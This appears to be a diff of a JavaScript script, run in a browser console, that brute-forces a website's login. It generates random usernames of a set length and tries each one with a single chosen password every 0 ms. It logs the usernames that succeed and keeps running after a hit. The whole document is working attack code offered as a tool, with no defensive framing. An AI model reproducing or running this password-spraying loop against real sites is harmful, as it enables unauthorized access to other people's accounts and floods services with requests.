@@ -12,13 +12,12 @@ try{
     if(opts.includeLetters) c += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
     if(opts.includeSymbols) c += "_-";
     if(opts.includeNumbers)  c += "0123456789";
-    if(!c){
-      alert("少なくとも1種類は選んでください");
-      throw new Error("文字種なし");
-    }
+    if(!c) throw new Error("文字種が選択されていません");
+
     let s = must || "";
     while(s.length < l) s += c.charAt(Math.floor(Math.random()*c.length));
     s = s.split("").sort(() => Math.random() - 0.5).join("");
+
     if(used.has(s)) return null;
     used.add(s);
     return s;
@@ -43,11 +42,7 @@ try{
       });
 
       if(res.status === 200){
-        log("lime", "★ 成功 ★ : " + u);
-        log("green", "→ " + u + " でログイン成功！（継続中）");
-        // ★ ここを削除・コメントアウトしたのがポイント ★
-        // clearInterval(window.loginTimer);
-        // alert("成功! " + u);  ← 毎回アラートが出るとうざいのでコメントアウト推奨
+        log("lime", "成功: " + u);
         return true;
       }
       return false;
@@ -63,63 +58,67 @@ try{
       d.id = "loginLogDiv";
       Object.assign(d.style, {
         position: "fixed",
-        top: "6px",
-        right: "6px",
-        width: "280px",
-        maxHeight: "60vh",
-        overflow: "auto",
-        background: "rgba(255,255,255,0.96)",
-        border: "2px solid #222",
+        top: "10px",
+        right: "10px",
+        width: "300px",
+        maxHeight: "70vh",
+        overflowY: "auto",
+        background: "rgba(0,0,0,0.85)",
+        color: "white",
+        border: "1px solid #444",
         zIndex: 999999,
-        fontSize: "13px",
-        padding: "8px",
-        fontFamily: "Consolas, monospace"
+        fontSize: "14px",
+        padding: "10px",
+        fontFamily: "Consolas, monospace",
+        borderRadius: "4px"
       });
-      let b = document.createElement("button");
-      b.textContent = "STOP";
-      b.style.cssText = "display:block; width:100%; margin-bottom:6px; padding:6px; background:#e33; color:white; border:none; cursor:pointer;";
-      b.onclick = function(){
+
+      let btn = document.createElement("button");
+      btn.textContent = "STOP";
+      btn.style.cssText = "width:100%; padding:8px; margin-bottom:8px; background:#c00; color:white; border:none; border-radius:4px; cursor:pointer;";
+      btn.onclick = () => {
         clearInterval(window.loginTimer);
-        log("crimson", "⛔ 強制停止しました");
+        log("orange", "停止しました");
       };
-      d.appendChild(b);
+      d.appendChild(btn);
+
       document.body.appendChild(d);
     }
-    let e = document.createElement("div");
-    e.style.color = color;
-    e.textContent = msg;
-    d.appendChild(e);
+
+    let line = document.createElement("div");
+    line.style.color = color;
+    line.textContent = msg;
+    d.appendChild(line);
     d.scrollTop = d.scrollHeight;
   }
 
   (async function(){
-    const len = parseInt(prompt("生成文字数を入力","3"),10);
+    const len = parseInt(prompt("生成する文字数","3"), 10);
     if(!len || isNaN(len)) return;
 
-    let must = prompt("必ず含める文字（なしはNO）","a");
-    if(must === "NO") must = "";
+    let must = prompt("必ず含める文字（なしなら空欄やNO）","");
+    if(must === "NO" || must === "no") must = "";
 
-    const includeLetters  = prompt("英字を含めますか？1=はい","1") === "1";
-    const includeSymbols  = prompt("_ -を含めますか？1=はい","1") === "1";
-    const includeNumbers  = prompt("数字を含めますか？1=はい","1") === "1";
+    const includeLetters  = prompt("英字を含める？ (1=はい)", "1") === "1";
+    const includeSymbols  = prompt("_-を含める？ (1=はい)", "1") === "1";
+    const includeNumbers  = prompt("数字を含める？ (1=はい)", "1") === "1";
 
-    const pass = prompt("試したいパスワードを入力");
+    const pass = prompt("試すパスワードを入力");
     if(!pass) return;
 
-    const opts = {includeLetters, includeSymbols, includeNumbers};
+    const opts = { includeLetters, includeSymbols, includeNumbers };
 
-    log("black", "▶ 開始 " + (new Date()).toLocaleTimeString());
-    log("gray",   "   ユーザー名長さ: " + len + "  |  必須文字: " + (must || "なし"));
-    log("gray",   "   パスワード: " + pass.replace(/./g,"*"));
+    log("white", "開始しました");
 
     window.loginTimer = setInterval(async () => {
-      const user = r(len, opts, must);
-      if(!user) return;   // 重複したらスキップ
+      let user;
+      do {
+        user = r(len, opts, must);
+      } while(!user);  // 重複したら即再生成
 
-      log("navy", "試行中: " + user);
       await login(user, pass);
-      // 成功してもここでは何もせず次のループへ
-    }, 0);   // 0ms = 可能な限り高速
+      // 成功以外は何も表示しない
+    }, 0);
 
   })();
 }catch(e){
